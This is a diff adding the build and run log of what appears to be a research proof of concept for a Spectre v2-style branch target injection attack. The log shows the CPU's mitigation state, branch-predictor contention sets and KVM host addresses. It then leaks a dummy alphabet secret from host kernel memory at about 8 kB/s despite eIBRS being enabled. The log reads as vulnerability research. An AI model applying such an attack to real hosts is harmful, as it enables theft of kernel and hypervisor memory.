@@ -1,0 +1,93 @@
+cc    -c -o snippets/snippet.o snippets/snippet.S
+cc    -c -o snippets/history.o snippets/history.S
+cc -c snippets/snippet.S -o snippets/snippet.o
+cc -c snippets/history.S -o snippets/history.o
+gcc  -o main main.c snippets/snippet.o snippets/history.o flush_and_reload.c jitting.c helper.c mitigations.c leakage_rate.c config.c ../../common/kmmap/mm.c -g -O3 -Wno-unused-function -no-pie -DINTEL_10_GEN -DTEST_KERNEL_VMM
+/usr/bin/ld: warning: snippets/history.o: missing .note.GNU-stack section implies executable stack
+/usr/bin/ld: NOTE: This behaviour is deprecated and will be removed in a future version of the linker
+Model name: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz
+BIOS Model name: pc-i440fx-noble CPU @ 2.0GHz
+Linux version: 6.8.0-38-generic
+Linux spectre_v2 mitigation info:
+- Enhanced / Automatic IBRS; IBPB: conditional; RSB filling; PBRSB-eIBRS: SW sequence; BHI: SW loop, KVM: SW loop
+================== ENVIRONMENT INFO ===================
+============== HARDWARE MITIGATION INFO ===============
+     IBRS/IBPB Support:  0 |                           
+         eIBRS Support:  1 |          eIBRS Enabled:  1
+                  RSBA:  0 |                           
+                 RRSBA:  0 |                           
+       CET_IBT Support:  0 |        IBT Kernel-mode:  0
+                           |          IBT User-mode:  0
+            IPRED_CTRL:  0 |            IPRED_DIS_S:  0
+            RRSBA_CTRL:  0 |            RRSBA_DIS_S:  0
+                           |            RRSBA_DIS_U:  0
+              DDP_CTRL:  0 |                 DDPD_U:  0
+              BHI_CTRL:  0 |              BHI_DIS_S:  0
+                BHI_NO:  0 |                           
+Seed: 1738084185
+Running on CPU: 0
+=================== GLOBAL SETTINGS ===================
+       Train in kernel:  1 |         Test in kernel:  2
+  Caller0 History type:  0 |   Caller1 History type:  0
+   Caller0 direct jump:  1 |    Caller1 direct jump:  0
+=======================================================
+ Contention Set: 0x302e537b2060 (tag: 0x0a1, set: 0x103, PC[5:0]: 0x020)
+ Contention Set: 0x3038d6a02060 (tag: 0x0da, set: 0x103, PC[5:0]: 0x020)
+ Contention Set: 0x301c7a5ee060 (tag: 0x092, set: 0x103, PC[5:0]: 0x020)
+ Contention Set: 0x301117f4e060 (tag: 0x08c, set: 0x103, PC[5:0]: 0x020)
+
+ KVM ind branch: 0xffffffffc15f2044 
+KVM spec target: 0xffffffffc15f2100 
+        caller0: 0xffffefffc15f2060 (tag: 0x079, set: 0x103, PC[5:0]: 0x020)
+        caller1: 0xffff8fffc05e2044 (tag: 0x079, set: 0x102, PC[5:0]: 0x004)
+        target0: 0xffffefffc15f2100 (offset: 0xa0)
+   target1_mock: 0xffff8fffc05f2ff7 (offset: 0x10fb3)
+  target1_short: 0xffff8fffc05e2100 (offset: 0xbc)
+   target1_near: 0xffff8fffc15f2100 (offset: 0x10100bc)
+   entry_off_c0: 0x3
+   entry_off_c1: 0x3
+                 SHORT            NEAR             FAR
+       INITIAL:      9 ( 90.0%)      0 (  0.0%)      0 (  0.0%)  (/10)
+        VERIFY:   9997 (100.0%)      0 (  0.0%)      0 (  0.0%)  (/10000)
+        VERIFY:   9999 (100.0%)      0 (  0.0%)      0 (  0.0%)  (/10000)
+        VERIFY:  10000 (100.0%)      0 (  0.0%)      0 (  0.0%)  (/10000)
+        VERIFY:   9999 (100.0%)      0 (  0.0%)      0 (  0.0%)  (/10000)
+        VERIFY:  10000 (100.0%)      0 (  0.0%)      0 (  0.0%)  (/10000)
+Total iterations: 1
+------------------------------------------------------
+Leaking a dummy secret...
+------------------------------------------------------
+secret addr user: 0x00007d1e53810000
+secret addr host: 0xffff9ea4aac10000
+0xffff9ea4aac10007: Found Byte: 0x41 (A) Used prefix: 0x00000000
+0xffff9ea4aac10009: Found Byte: 0x42 (B) Used prefix: 0x41000000000000
+0xffff9ea4aac1000b: Found Byte: 0x43 (C) Used prefix: 0x42410000000000
+0xffff9ea4aac1000d: Found Byte: 0x44 (D) Used prefix: 0x43424100000000
+0xffff9ea4aac1000f: Found Byte: 0x45 (E) Used prefix: 0x44434241000000
+0xffff9ea4aac10011: Found Byte: 0x46 (F) Used prefix: 0x45444342410000
+0xffff9ea4aac10013: Found Byte: 0x47 (G) Used prefix: 0x46454443424100
+0xffff9ea4aac10015: Found Byte: 0x48 (H) Used prefix: 0x47464544434241
+0xffff9ea4aac10017: Found Byte: 0x49 (I) Used prefix: 0x48474645444342
+0xffff9ea4aac10019: Found Byte: 0x4a (J) Used prefix: 0x49484746454443
+0xffff9ea4aac1001b: Found Byte: 0x4b (K) Used prefix: 0x4a494847464544
+0xffff9ea4aac1001d: Found Byte: 0x4c (L) Used prefix: 0x4b4a4948474645
+0xffff9ea4aac1001f: Found Byte: 0x4d (M) Used prefix: 0x4c4b4a49484746
+0xffff9ea4aac10021: Found Byte: 0x4e (N) Used prefix: 0x4d4c4b4a494847
+0xffff9ea4aac10023: Found Byte: 0x4f (O) Used prefix: 0x4e4d4c4b4a4948
+0xffff9ea4aac10025: Found Byte: 0x50 (P) Used prefix: 0x4f4e4d4c4b4a49
+0xffff9ea4aac10027: Found Byte: 0x51 (Q) Used prefix: 0x504f4e4d4c4b4a
+0xffff9ea4aac10029: Found Byte: 0x52 (R) Used prefix: 0x51504f4e4d4c4b
+0xffff9ea4aac1002b: Found Byte: 0x53 (S) Used prefix: 0x5251504f4e4d4c
+0xffff9ea4aac1002d: Found Byte: 0x54 (T) Used prefix: 0x535251504f4e4d
+0xffff9ea4aac1002f: Found Byte: 0x55 (U) Used prefix: 0x54535251504f4e
+0xffff9ea4aac10031: Found Byte: 0x56 (V) Used prefix: 0x5554535251504f
+0xffff9ea4aac10033: Found Byte: 0x57 (W) Used prefix: 0x56555453525150
+0xffff9ea4aac10035: Found Byte: 0x58 (X) Used prefix: 0x57565554535251
+0xffff9ea4aac10037: Found Byte: 0x59 (Y) Used prefix: 0x58575655545352
+0xffff9ea4aac10039: Found Byte: 0x5a (Z) Used prefix: 0x59585756555453
+------------------------------------------------------
+Testing leakage rate from kernel
+------------------------------------------------------
+
+4 kB took  0.5 seconds (8126.6 Byte/sec)
+Fault rate: 0.000%
